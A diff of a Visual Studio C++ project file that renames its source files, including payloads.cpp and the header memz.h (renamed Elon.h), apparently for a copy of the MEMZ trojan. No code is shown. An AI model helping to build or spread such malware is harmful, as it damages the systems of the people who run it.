@@ -140,15 +140,15 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="data.cpp" />
-    <ClCompile Include="main.cpp" />
-    <ClCompile Include="payloads.cpp" />
-    <ClCompile Include="utils.cpp" />
-    <ClCompile Include="win32_crt_float.cpp" />
+    <ClCompile Include="Main.cpp" />
+    <ClCompile Include="Payloads.cpp" />
+    <ClCompile Include="Utils.cpp" />
+    <ClCompile Include="32bit architecture.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="data.h" />
-    <ClInclude Include="memz.h" />
-    <ClInclude Include="payloads.h" />
+    <ClInclude Include="Elon.h" />
+    <ClInclude Include="Payloads.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
